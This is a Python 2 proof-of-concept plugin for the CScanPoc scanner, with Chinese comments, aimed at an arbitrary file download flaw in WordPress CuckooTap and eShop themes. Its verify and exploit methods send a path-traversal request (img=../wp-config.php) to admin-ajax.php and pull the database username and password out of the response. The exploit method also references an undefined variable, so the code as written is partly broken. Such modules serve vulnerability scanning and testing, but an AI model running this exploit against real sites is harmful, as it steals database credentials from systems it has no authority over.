# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib,urllib2
import re

class Vuln(ABVuln):
    vuln_id = 'wordpress_0004_bb2' # 平台漏洞编号，留空
    name = 'WordPress CuckooTap&eShop Themes 任意文件下载漏洞' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.FILE_DOWNLOAD # 漏洞类型
    disclosure_date = '2014-09-01'  # 漏洞公布时间
    desc = '''
        WordPress中的CuckooTap和eShop主题中image_view.class.php文件传入的img参数未经过过滤直接下载，造成任意文件下载，以至信息泄露。
    ''' # 漏洞描述
    ref = 'https://www.exploit-db.com/exploits/34511/' # 漏洞来源
    cnvd_id = '' # cnvd漏洞编号
    cve_id = '' #cve编号
    product = 'WordPress'  # 漏洞应用名称
    product_version = ''  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'f18a127c-9892-4eeb-a645-bebc83eeea4d'
    author = 'cscan'  # POC编写者
    create_date = '2018-05-04' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))      
            
            vul_url = '{target}/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php'.format(target=self.target)
            match_db = re.compile('define\(\'DB_[\w]+\', \'(.*)\'\);')

            response = urllib2.urlopen(urllib2.Request(vul_url)).read()
            data = match_db.findall(response)

            if data:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 漏洞利用'.format(
                    target=self.target, vuln=self.vuln))
            
            vul_url = '{target}/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php'.format(target=self.target)
            match_db = re.compile('define\(\'DB_[\w]+\', \'(.*)\'\);')
            
            response = urllib2.urlopen(urllib2.Request(vul_url)).read()
            data = match_db.findall(response)
            if data:
                username = data[1]
                password = data[2]
            
            if res:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞，获取到的数据库用户名为{username} 数据库密码为{password}'.format(target=self.target,name=self.vuln.name,username=username,password=password))
        
        except Exception, e:
            self.output.info('执行异常{}'.format(e))
        

if __name__ == '__main__':
    Poc().run()